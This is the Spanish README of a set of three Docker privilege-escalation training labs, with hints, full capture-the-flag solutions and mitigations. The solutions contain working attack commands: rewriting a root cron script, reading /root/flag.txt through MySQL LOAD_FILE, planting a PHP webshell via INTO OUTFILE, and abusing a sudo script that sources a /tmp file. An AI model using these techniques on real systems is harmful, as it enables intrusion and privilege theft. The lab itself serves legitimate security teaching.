# 🔓 Laboratorios de Escalada de Privilegios — Servicios Internos

Colección de 3 laboratorios Docker con dificultad progresiva para practicar técnicas de escalada de privilegios a través de la explotación de servicios internos mal configurados.

> **⚠️ AVISO LEGAL:** Estos laboratorios son exclusivamente para fines educativos. Las técnicas aquí descritas deben practicarse únicamente en entornos controlados y con autorización. Nunca apliques estas técnicas en sistemas que no te pertenezcan.

---

## Requisitos Previos

- Docker instalado (v20.10+)
- Conocimientos básicos de Linux y terminal
- Familiaridad con conceptos de redes y servicios

---

## Estructura del Proyecto

```
privesc-labs/
├── lab1-apache-cron/
│   └── Dockerfile
├── lab2-mysql-privesc/
│   └── Dockerfile
├── lab3-service-chain/
│   └── Dockerfile
└── README.md
```

---

## Lab 1 — Apache Exposed (Fácil)

### Escenario

Una empresa tiene un servidor web Apache con una configuración descuidada. El módulo `mod_status` está habilitado y accesible públicamente, exponiendo información sensible del servidor. Además, existe un cron job de root que ejecuta un script con permisos inseguros.

### Servicios involucrados

- **Apache 2** con `mod_status` habilitado sin restricciones
- **Cron** ejecutando un script de backup como root cada minuto

### Construir y ejecutar

```bash
cd lab1-apache-cron
docker build -t privesc-lab1 .
docker run -it --rm --name lab1 -p 8081:80 privesc-lab1
```

### Credenciales

| Usuario | Contraseña |
|---------|------------|
| student | student123 |

### Objetivo

Leer el contenido de `/root/flag.txt`.

### Habilidades que se practican

- Enumeración de servicios web
- Identificación de información expuesta por `mod_status`
- Detección de cron jobs y scripts con permisos inseguros
- Modificación de scripts ejecutados por root (cron abuse)

### Pistas progresivas

<details>
<summary>Pista 1 — Reconocimiento</summary>

Visita `http://localhost:8081/server-status` y revisa el código fuente de la página principal. ¿Hay comentarios interesantes?

</details>

<details>
<summary>Pista 2 — Enumeración</summary>

Revisa qué procesos corren en el sistema con `ps aux`. Busca cron jobs con `cat /etc/cron.d/*` y verifica los permisos de los scripts que ejecutan.

</details>

<details>
<summary>Pista 3 — Explotación</summary>

El archivo `/opt/scripts/backup.sh` es ejecutado por root cada minuto y tiene permisos de escritura para www-data/student. Modifica su contenido para copiar la flag o crear una reverse shell.

</details>

<details>
<summary>Solución completa</summary>

```bash
# 1. Descubrir mod_status
curl http://localhost/server-status

# 2. Encontrar el cron job
cat /etc/cron.d/backup-job
ls -la /opt/scripts/backup.sh

# 3. Modificar el script de backup
echo '#!/bin/bash
cp /root/flag.txt /tmp/flag.txt
chmod 644 /tmp/flag.txt' > /opt/scripts/backup.sh

# 4. Esperar ~60 segundos y leer la flag
cat /tmp/flag.txt
```

</details>

---

## Lab 2 — Database Nightmare (Intermedio)

### Escenario

Un sistema de gestión de empleados conecta a una base de datos MySQL. Las credenciales están hardcodeadas en un archivo de configuración PHP legible. MySQL tiene privilegios excesivos y corre como root con `secure-file-priv` deshabilitado, permitiendo leer y escribir archivos arbitrarios del sistema.

### Servicios involucrados

- **Apache 2 + PHP** sirviendo la aplicación web
- **MySQL** corriendo como usuario root con permisos de archivo habilitados

### Construir y ejecutar

```bash
cd lab2-mysql-privesc
docker build -t privesc-lab2 .
docker run -it --rm --name lab2 -p 8082:80 privesc-lab2
```

### Credenciales

| Usuario | Contraseña |
|---------|------------|
| student | student123 |

### Objetivo

Leer el contenido de `/root/flag.txt`.

### Habilidades que se practican

- Búsqueda de credenciales en archivos de configuración
- Enumeración de bases de datos y tablas
- Explotación de MySQL con `LOAD_FILE()` y `INTO OUTFILE`
- Lectura de archivos del sistema a través de la base de datos

### Pistas progresivas

<details>
<summary>Pista 1 — Reconocimiento</summary>

Explora `/var/www/html/` y busca archivos de configuración. Los archivos ocultos también pueden contener información útil (`ls -la`).

</details>

<details>
<summary>Pista 2 — Credenciales</summary>

El archivo `config.php` contiene credenciales de la base de datos. Conéctate con `mysql -u webapp_user -p`. Explora las tablas, especialmente la tabla `secrets`.

</details>

<details>
<summary>Pista 3 — Explotación</summary>

El usuario MySQL tiene privilegio FILE y `secure-file-priv` está deshabilitado. Usa `SELECT LOAD_FILE('/root/flag.txt');` para leer archivos del sistema como root.

</details>

<details>
<summary>Solución completa</summary>

```bash
# 1. Encontrar credenciales
cat /var/www/html/config.php
# Resultado: webapp_user / S3cur3_But_N0t_3n0ugh!

# 2. Conectar a MySQL
mysql -u webapp_user -p'S3cur3_But_N0t_3n0ugh!'

# 3. Explorar la base de datos
USE webapp;
SELECT * FROM secrets;
# Pista: MySQL corre como root, investigar LOAD_FILE()

# 4. Verificar privilegios
SHOW GRANTS;
# Tiene ALL PRIVILEGES incluyendo FILE

# 5. Leer la flag directamente
SELECT LOAD_FILE('/root/flag.txt');

# Bonus: Escribir un webshell
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
# Luego: curl "http://localhost/shell.php?cmd=cat+/root/flag.txt"
```

</details>

---

## Lab 3 — Service Chain (Avanzado)

### Escenario

Una infraestructura corporativa tiene múltiples servicios internos interconectados: un portal web Apache+PHP, un servidor Redis sin autenticación que almacena credenciales y configuración, un servicio SSH, y un usuario de monitoreo con permisos sudo limitados pero explotables. El atacante debe encadenar múltiples vulnerabilidades para escalar desde un usuario básico hasta root.

### Servicios involucrados

- **Apache 2 + PHP** con panel de administración conectado a Redis
- **Redis** sin autenticación, almacenando credenciales y API keys
- **SSH** para acceso con las credenciales descubiertas
- **Sudo** con script de monitoreo vulnerable

### Construir y ejecutar

```bash
cd lab3-service-chain
docker build -t privesc-lab3 .
docker run -it --rm --name lab3 -p 8083:80 -p 2222:22 privesc-lab3
```

### Credenciales iniciales

| Usuario | Contraseña |
|---------|------------|
| student | student123 |

### Objetivos (dos flags)

1. **User flag:** Leer `/home/svc_monitor/user_flag.txt`
2. **Root flag:** Leer `/root/flag.txt`

### Habilidades que se practican

- Enumeración de servicios y puertos internos
- Explotación de Redis sin autenticación
- Descubrimiento de paneles de administración ocultos
- Uso de credenciales para movimiento lateral
- Identificación de sudo misconfigurations
- Abuso de scripts con `source` de archivos controlables
- Encadenamiento de vulnerabilidades (service chaining)

### Pistas progresivas

<details>
<summary>Pista 1 — Reconocimiento</summary>

Lee `welcome.txt` en tu home. Enumera puertos abiertos con `ss -tlnp` o `netstat -tlnp`. Identifica qué servicios corren internamente. Revisa el código fuente del portal web.

</details>

<details>
<summary>Pista 2 — Redis</summary>

Redis escucha en el puerto 6379 sin autenticación. Usa `redis-cli` para conectarte y listar las keys: `KEYS *`. Lee cada valor con `GET <key>`.

</details>

<details>
<summary>Pista 3 — Panel de administración</summary>

Redis contiene la ruta a un panel admin y una API key. Usa `curl` con los parámetros correctos para acceder al endpoint de diagnóstico.

</details>

<details>
<summary>Pista 4 — Movimiento lateral</summary>

Redis también contiene credenciales de un usuario de servicio. Usa `su` para cambiar a ese usuario. Lee la user flag.

</details>

<details>
<summary>Pista 5 — Escalada a root</summary>

Verifica qué puede ejecutar `svc_monitor` con `sudo -l`. El script de monitoreo hace `source /tmp/.post_check.sh` si existe. Crea ese archivo con comandos que quieras ejecutar como root.

</details>

<details>
<summary>Solución completa</summary>

```bash
# === FASE 1: Enumeración ===
cat ~/welcome.txt
ss -tlnp
curl http://localhost/
# Comentario HTML menciona puerto 6379 y /internal/

# === FASE 2: Redis sin auth ===
redis-cli
KEYS *
GET admin:credentials        # svc_monitor:M0n1t0r_S3rv1c3!
GET internal:api_key         # ak-7f8e9d0c1b2a3456
GET app:config               # revela /internal/admin.php
GET system:note              # svc_monitor tiene sudo

# === FASE 3: Panel admin (opcional) ===
curl "http://localhost/internal/admin.php?key=ak-7f8e9d0c1b2a3456&cmd=id"
# Ejecuta comandos como www-data

# === FASE 4: Movimiento lateral a svc_monitor ===
su - svc_monitor
# Contraseña: M0n1t0r_S3rv1c3!
cat ~/user_flag.txt
# FLAG{lab3_service_chain_user_pivot}

# === FASE 5: Escalada a root ===
sudo -l
# (ALL) NOPASSWD: /opt/monitoring/check_services.sh

# Revisar el script
cat /opt/monitoring/check_services.sh
# Observar: source /tmp/.post_check.sh al final

# Crear el script malicioso
echo 'cp /root/flag.txt /tmp/root_flag.txt && chmod 644 /tmp/root_flag.txt' > /tmp/.post_check.sh

# Ejecutar con sudo
sudo /opt/monitoring/check_services.sh

# Leer la flag
cat /tmp/root_flag.txt
# FLAG{lab3_multi_service_full_chain_root}
```

</details>

---

## Resumen de Técnicas por Laboratorio

| Lab | Dificultad | Servicios | Técnica Principal | Vector de Escalada |
|-----|-----------|-----------|-------------------|-------------------|
| 1 | Fácil | Apache + Cron | Information Disclosure + Cron Abuse | Script world-writable ejecutado por root |
| 2 | Intermedio | Apache + PHP + MySQL | Credential Harvesting + MySQL File Privs | `LOAD_FILE()` / `INTO OUTFILE` como root |
| 3 | Avanzado | Apache + Redis + SSH + Sudo | Service Chaining | Redis → credenciales → sudo → source injection |

---

## Comandos Rápidos

```bash
# Construir todos los labs
docker build -t privesc-lab1 lab1-apache-cron/
docker build -t privesc-lab2 lab2-mysql-privesc/
docker build -t privesc-lab3 lab3-service-chain/

# Ejecutar (cada uno en una terminal diferente)
docker run -it --rm --name lab1 -p 8081:80 privesc-lab1
docker run -it --rm --name lab2 -p 8082:80 privesc-lab2
docker run -it --rm --name lab3 -p 8083:80 -p 2222:22 privesc-lab3

# Limpiar
docker stop lab1 lab2 lab3
docker rmi privesc-lab1 privesc-lab2 privesc-lab3
```

---

## Consejos para la Comunidad

**Si eres instructor o compartes estos labs:**

- Comparte solo este README sin las secciones de soluciones (o pide a los participantes que no las abran)
- Anima a los participantes a documentar su proceso de resolución
- Sugiere un tiempo límite por lab: Lab 1 (~30 min), Lab 2 (~45 min), Lab 3 (~90 min)
- Los labs se pueden usar en CTF internos: cada flag vale puntos

**Si estás aprendiendo:**

- Intenta resolver cada lab sin mirar las pistas
- Si te atascas, lee solo UNA pista a la vez
- Documenta cada paso que hagas, incluyendo los callejones sin salida
- Después de resolver un lab, piensa en cómo mitigarías cada vulnerabilidad encontrada

---

## Herramientas Útiles

Estas herramientas ya están instaladas en los contenedores o puedes usarlas desde tu máquina host:

- `curl` — Peticiones HTTP para explorar servicios web
- `netstat` / `ss` — Enumeración de puertos y servicios
- `ps aux` — Procesos en ejecución
- `find / -writable` — Buscar archivos con permisos de escritura
- `sudo -l` — Verificar permisos sudo del usuario actual
- `redis-cli` — Cliente de Redis (Lab 3)
- `mysql` — Cliente MySQL (Lab 2)
- `nmap` — Escaneo de puertos (Lab 3)

---

## Mitigaciones (Post-Lab)

Después de completar cada lab, reflexiona sobre cómo prevenir cada vulnerabilidad:

**Lab 1:** Deshabilitar `mod_status` o restringirlo por IP. Nunca dar permisos de escritura a scripts ejecutados por cron como root. Usar el principio de mínimo privilegio.

**Lab 2:** No almacenar credenciales en archivos de configuración legibles. Ejecutar MySQL con un usuario dedicado, no root. Habilitar `secure-file-priv` y eliminar el privilegio FILE innecesario. Usar variables de entorno o vaults para secretos.

**Lab 3:** Configurar autenticación en Redis (`requirepass`). No almacenar credenciales en bases de datos de caché. Auditar scripts ejecutados con sudo, eliminar `source` de archivos en ubicaciones temporales. Revisar configuraciones de sudo regularmente. Segmentar la red entre servicios.

---

*Creado con fines educativos. Practica siempre en entornos autorizados.*